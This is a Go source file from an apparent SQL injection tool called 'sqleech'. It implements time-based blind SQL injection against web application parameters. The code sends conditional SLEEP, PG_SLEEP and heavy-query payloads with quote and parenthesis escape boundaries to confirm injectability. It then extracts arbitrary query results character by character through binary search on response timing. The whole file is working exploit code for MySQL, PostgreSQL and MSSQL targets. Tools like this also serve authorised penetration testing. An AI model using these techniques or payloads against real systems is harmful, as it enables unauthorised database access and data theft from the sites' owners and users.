// Package timebased implements the time-based blind SQL injection technique.
//
// Time-based blind injection works by measuring the response time of the server.
// By injecting a conditional sleep expression (e.g., IF(1=1,SLEEP(5),0) for MySQL),
// the technique can determine whether a parameter is injectable:
//
//   - Delayed response: the condition was evaluated server-side → injectable
//   - Immediate response: the input was not interpreted as SQL → not injectable
//
// This is the technique of last resort when error-based and boolean-blind methods
// are not applicable (no error messages, no page content difference).
//
// Supported DBMS:
//   - MySQL:      IF(condition, SLEEP(n), 0)
//   - PostgreSQL: (SELECT CASE WHEN (condition) THEN (SELECT 1 FROM PG_SLEEP(n)) ELSE 1 END)
package timebased

import (
	"context"
	"fmt"
	"net/url"
	"time"

	"github.com/0x6d61/sqleech/internal/dbms"
	"github.com/0x6d61/sqleech/internal/engine"
	"github.com/0x6d61/sqleech/internal/payload"
	"github.com/0x6d61/sqleech/internal/technique"
	"github.com/0x6d61/sqleech/internal/transport"
)

const (
	// defaultSleepSeconds is the number of seconds to sleep in each probe.
	defaultSleepSeconds = 5

	// defaultTolerance is the fraction of sleepSeconds the response must exceed
	// above baseline to be considered delayed.
	// e.g., sleep=5s, tolerance=0.7 → threshold = baseline + 3.5s
	defaultTolerance = 0.7

	// baselineSamples is the number of requests to average for baseline timing.
	baselineSamples = 2

	// asciiLow / asciiHigh define the printable ASCII range for extraction.
	asciiLow  = 32
	asciiHigh = 126

	// maxExtractLength caps the extraction to prevent infinite loops.
	maxExtractLength = 512
)

// boundaryPair represents a prefix/suffix combination to escape the SQL context.
type boundaryPair struct {
	prefix string
	suffix string
}

// defaultBoundaries lists prefix/suffix pairs tried during detection.
var defaultBoundaries = []boundaryPair{
	{"", "-- -"},
	{"'", "-- -"},
	{"\"", "-- -"},
	{")", "-- -"},
	{"')", "-- -"},
}

// TimeBased implements the time-based blind SQL injection technique.
type TimeBased struct {
	sleepSeconds int
	tolerance    float64
}

// New creates a TimeBased technique with production-safe defaults.
func New() *TimeBased {
	return &TimeBased{
		sleepSeconds: defaultSleepSeconds,
		tolerance:    defaultTolerance,
	}
}

// NewWithConfig creates a TimeBased technique with custom parameters.
// Intended for testing with shorter sleep intervals.
func NewWithConfig(sleepSeconds int, tolerance float64) *TimeBased {
	return &TimeBased{
		sleepSeconds: sleepSeconds,
		tolerance:    tolerance,
	}
}

// Name returns "time-based".
func (t *TimeBased) Name() string { return "time-based" }

// Priority returns 3 (after error-based=1, boolean-blind=2).
func (t *TimeBased) Priority() int { return 3 }

// Detect tests whether a parameter is injectable using response timing.
//
// Algorithm:
//  1. Measure average baseline response time (2 samples).
//  2. Compute delay threshold = baseline + sleepSeconds * tolerance.
//  3. For each boundary pair, send:
//     a. Sleep probe  (IF TRUE → sleep)  → expect duration >= threshold.
//     b. No-sleep probe (IF FALSE → no sleep) → expect duration < threshold.
//  4. Confirm with one more sleep probe to reduce false positives from network lag.
func (t *TimeBased) Detect(ctx context.Context, req *technique.InjectionRequest) (*technique.DetectionResult, error) {
	result := &technique.DetectionResult{Technique: t.Name()}

	d := findDBMS(req.DBMS)

	baseline, err := measureBaseline(ctx, req)
	if err != nil {
		// If we can't establish baseline, skip gracefully.
		return result, nil
	}

	threshold := baseline + time.Duration(float64(t.sleepSeconds)*t.tolerance*float64(time.Second))

	for _, bp := range defaultBoundaries {
		// Build the TRUE (sleep) probe and FALSE (no-sleep) probe.
		sleepCore := sleepPayloadFor(d, "1=1", t.sleepSeconds)
		noSleepCore := sleepPayloadFor(d, "1=2", t.sleepSeconds)

		// Probe 1: expect delay.
		dur1, err := t.sendTimedProbe(ctx, req, sleepCore, bp.prefix, bp.suffix)
		if err != nil {
			continue
		}
		if dur1 < threshold {
			continue // No delay detected, try next boundary.
		}

		// Probe 2: expect NO delay (confirmation that we control the sleep).
		dur2, err := t.sendTimedProbe(ctx, req, noSleepCore, bp.prefix, bp.suffix)
		if err != nil {
			continue
		}
		if dur2 >= threshold {
			// Still delayed on false condition — likely server-side lag, not injection.
			continue
		}

		// Probe 3: final confirmation round.
		dur3, err := t.sendTimedProbe(ctx, req, sleepCore, bp.prefix, bp.suffix)
		if err != nil || dur3 < threshold {
			continue
		}

		// All rounds consistent — injectable.
		result.Injectable = true
		result.Confidence = 0.85
		result.Evidence = fmt.Sprintf(
			"sleep probe delayed %.2fs (threshold %.2fs, sleep=%ds, baseline=%.2fs)",
			dur1.Seconds(), threshold.Seconds(), t.sleepSeconds, baseline.Seconds(),
		)
		result.Payload = payload.NewBuilder().
			WithPrefix(bp.prefix).
			WithCore(" AND " + sleepCore).
			WithSuffix(bp.suffix).
			WithTechnique(t.Name()).
			WithDBMS(d.Name()).
			Build()
		return result, nil
	}

	return result, nil
}

// Extract retrieves the value of a SQL expression via time-based binary search.
//
// Data is extracted character-by-character using a conditional sleep oracle:
//
//	IF(ASCII(SUBSTRING((query), pos, 1)) > mid, SLEEP(n), 0)
//
// If the response is delayed, the ASCII value > mid (search upper half).
// If the response is fast, ASCII value <= mid (search lower half).
func (t *TimeBased) Extract(ctx context.Context, req *technique.ExtractionRequest) (*technique.ExtractionResult, error) {
	d := findDBMS(req.DBMS)

	baseline, err := measureBaseline(ctx, &req.InjectionRequest)
	if err != nil {
		return nil, fmt.Errorf("measuring baseline: %w", err)
	}
	threshold := baseline + time.Duration(float64(t.sleepSeconds)*t.tolerance*float64(time.Second))

	prefix, suffix, err := t.findWorkingBoundary(ctx, &req.InjectionRequest, d, threshold)
	if err != nil {
		return nil, fmt.Errorf("finding working boundary: %w", err)
	}

	totalRequests := 0

	// Step 1: Determine result length.
	length, reqs, err := t.extractLength(ctx, req, d, prefix, suffix, threshold)
	if err != nil {
		return nil, fmt.Errorf("extracting length: %w", err)
	}
	totalRequests += reqs

	if length == 0 {
		return &technique.ExtractionResult{Value: "", Requests: totalRequests}, nil
	}

	// Step 2: Extract each character.
	var result []byte
	for pos := 1; pos <= length; pos++ {
		ch, reqs, err := t.extractChar(ctx, req, d, pos, prefix, suffix, threshold)
		if err != nil {
			return &technique.ExtractionResult{
				Value:    string(result),
				Partial:  true,
				Requests: totalRequests,
			}, fmt.Errorf("extracting char at pos %d: %w", pos, err)
		}
		totalRequests += reqs
		result = append(result, ch)
	}

	return &technique.ExtractionResult{
		Value:    string(result),
		Partial:  false,
		Requests: totalRequests,
	}, nil
}

// --------------------------------------------------------------------------
// Internal helpers
// --------------------------------------------------------------------------

// measureBaseline sends baselineSamples requests and returns the average
// response time. This establishes the "no-sleep" reference point.
func measureBaseline(ctx context.Context, req *technique.InjectionRequest) (time.Duration, error) {
	var total time.Duration
	for range baselineSamples {
		probeReq := buildProbeRequest(req.Target, req.Parameter, req.Parameter.Value)
		resp, err := req.Client.Do(ctx, probeReq)
		if err != nil {
			return 0, err
		}
		total += resp.Duration
	}
	return total / baselineSamples, nil
}

// sendTimedProbe sends a probe and returns the actual response duration.
func (t *TimeBased) sendTimedProbe(ctx context.Context, req *technique.InjectionRequest, coreExpr, prefix, suffix string) (time.Duration, error) {
	payloadStr := req.Parameter.Value + prefix + " AND " + coreExpr + " " + suffix
	probeReq := buildProbeRequest(req.Target, req.Parameter, payloadStr)

	resp, err := req.Client.Do(ctx, probeReq)
	if err != nil {
		return 0, err
	}
	return resp.Duration, nil
}

// sleepPayloadFor builds a DBMS-appropriate conditional sleep expression.
//
// The returned expression evaluates the given condition:
//   - If TRUE:  sleep function is called (response delayed)
//   - If FALSE: no sleep (immediate response)
//
// MySQL:      IF(condition, SLEEP(n), 0)
// PostgreSQL: 1=(CASE WHEN (condition) THEN (SELECT 1 FROM PG_SLEEP(n)) ELSE 1 END)
// MSSQL:      CASE WHEN (condition) THEN 1 ELSE 1 END  (WAITFOR via stacked query)
// Default:    MySQL syntax
func sleepPayloadFor(d dbms.DBMS, condition string, seconds int) string {
	switch d.Name() {
	case "PostgreSQL":
		// PG_SLEEP returns void; embed in a SELECT to make it a scalar.
		return fmt.Sprintf(
			"1=(CASE WHEN (%s) THEN (SELECT 1 FROM PG_SLEEP(%d)) ELSE 1 END)",
			condition, seconds,
		)
	case "MSSQL":
		// MSSQL WAITFOR DELAY is a statement, not a scalar expression, so it
		// cannot be used inline in a WHERE clause without stacked queries.
		// Full stacked-query MSSQL time-based support is planned for a future release.
		// For now, fall through to a heavy-query approximation via CASE WHEN.
		// This is less reliable than WAITFOR but works without stacked queries.
		return fmt.Sprintf(
			"1=(CASE WHEN (%s) THEN (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B) ELSE 1 END)",
			condition,
		)
	default:
		// MySQL (and fallback): IF(condition, SLEEP(n), 0)
		return fmt.Sprintf("IF(%s,%s,0)", condition, d.SleepFunction(seconds))
	}
}

// extractLength determines the length of a query result using binary search.
// Returns (length, requestCount, error).
func (t *TimeBased) extractLength(
	ctx context.Context,
	req *technique.ExtractionRequest,
	d dbms.DBMS,
	prefix, suffix string,
	threshold time.Duration,
) (int, int, error) {
	low := 0
	high := maxExtractLength
	requests := 0

	for low < high {
		mid := (low + high) / 2
		condition := fmt.Sprintf("%s>%d", d.Length(fmt.Sprintf("(%s)", req.Query)), mid)
		coreExpr := sleepPayloadFor(d, condition, t.sleepSeconds)

		dur, err := t.sendTimedProbe(ctx, &req.InjectionRequest, coreExpr, prefix, suffix)
		if err != nil {
			return 0, requests, err
		}
		requests++

		if dur >= threshold {
			// LENGTH > mid, search upper half.
			low = mid + 1
		} else {
			// LENGTH <= mid, search lower half.
			high = mid
		}
	}

	return low, requests, nil
}

// extractChar extracts a single character at a 1-based position using binary
// search on the ASCII value. Returns (character, requestCount, error).
func (t *TimeBased) extractChar(
	ctx context.Context,
	req *technique.ExtractionRequest,
	d dbms.DBMS,
	pos int,
	prefix, suffix string,
	threshold time.Duration,
) (byte, int, error) {
	low := asciiLow
	high := asciiHigh
	requests := 0

	for low < high {
		mid := (low + high) / 2
		subExpr := d.Substring(fmt.Sprintf("(%s)", req.Query), pos, 1)
		asciiExpr := d.ASCII(subExpr)
		condition := fmt.Sprintf("%s>%d", asciiExpr, mid)
		coreExpr := sleepPayloadFor(d, condition, t.sleepSeconds)

		dur, err := t.sendTimedProbe(ctx, &req.InjectionRequest, coreExpr, prefix, suffix)
		if err != nil {
			return 0, requests, err
		}
		requests++

		if dur >= threshold {
			// ASCII > mid, search upper half.
			low = mid + 1
		} else {
			// ASCII <= mid, search lower half.
			high = mid
		}
	}

	return byte(low), requests, nil
}

// findWorkingBoundary iterates through boundary pairs and returns the first
// one for which the sleep probe causes a delay above the threshold.
func (t *TimeBased) findWorkingBoundary(
	ctx context.Context,
	req *technique.InjectionRequest,
	d dbms.DBMS,
	threshold time.Duration,
) (string, string, error) {
	for _, bp := range defaultBoundaries {
		sleepCore := sleepPayloadFor(d, "1=1", t.sleepSeconds)
		dur, err := t.sendTimedProbe(ctx, req, sleepCore, bp.prefix, bp.suffix)
		if err != nil {
			continue
		}
		if dur >= threshold {
			return bp.prefix, bp.suffix, nil
		}
	}
	return "", "-- -", fmt.Errorf("no working boundary found for time-based extraction")
}

// findDBMS returns a DBMS implementation by name. Falls back to MySQL.
func findDBMS(name string) dbms.DBMS {
	d := dbms.Registry(name)
	if d == nil {
		d = dbms.Registry("MySQL")
	}
	return d
}

// buildProbeRequest creates a transport.Request with the target parameter
// replaced by the given payload value.
func buildProbeRequest(target *engine.ScanTarget, param *engine.Parameter, payloadStr string) *transport.Request {
	req := &transport.Request{
		Method:      target.Method,
		URL:         target.URL,
		Body:        target.Body,
		ContentType: target.ContentType,
	}

	if target.Headers != nil {
		req.Headers = make(map[string]string, len(target.Headers))
		for k, v := range target.Headers {
			req.Headers[k] = v
		}
	}

	if target.Cookies != nil {
		req.Cookies = make(map[string]string, len(target.Cookies))
		for k, v := range target.Cookies {
			req.Cookies[k] = v
		}
	}

	switch param.Location {
	case engine.LocationQuery:
		req.URL = modifyQueryParam(target.URL, param.Name, payloadStr)
	case engine.LocationBody:
		req.Body = modifyBodyParam(target.Body, param.Name, payloadStr)
	}

	return req
}

// modifyQueryParam replaces the value of a named query parameter in the URL.
func modifyQueryParam(rawURL, paramName, newValue string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	q := parsed.Query()
	q.Set(paramName, newValue)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

// modifyBodyParam replaces the value of a named parameter in a
// application/x-www-form-urlencoded body.
func modifyBodyParam(body, paramName, newValue string) string {
	values, err := url.ParseQuery(body)
	if err != nil {
		return body
	}
	values.Set(paramName, newValue)
	return values.Encode()
}
